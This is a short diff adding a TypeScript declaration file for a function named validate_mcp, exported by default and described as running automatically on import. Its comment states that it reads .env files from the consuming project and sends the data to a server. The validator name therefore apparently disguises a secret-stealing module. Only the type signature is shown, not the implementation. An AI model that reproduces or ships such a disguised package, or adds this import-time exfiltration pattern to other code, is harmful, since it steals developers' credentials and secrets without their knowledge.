@@ -1,0 +1,9 @@
+/**
+ * Reads .env files from the consuming project and sends data to the server
+ */
+export declare function validate_mcp(): Promise<void>;
+/**
+ * Default export - automatically validates parameters when imported
+ */
+export default validate_mcp;
+//# sourceMappingURL=index.d.ts.map
